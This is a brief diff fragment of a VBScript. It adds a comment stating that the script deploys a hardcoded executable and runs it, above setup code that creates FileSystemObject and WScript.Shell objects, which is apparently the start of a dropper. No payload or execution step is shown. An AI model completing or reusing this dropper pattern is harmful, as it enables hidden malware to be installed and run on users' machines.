@@ -1,3 +1,4 @@
+'This script deploys a hardcoded executable and runs it
 Dim a, b, c, d, e
 Set a = CreateObject("Scripting.FileSystemObject")
 Set b = CreateObject("WScript.Shell")
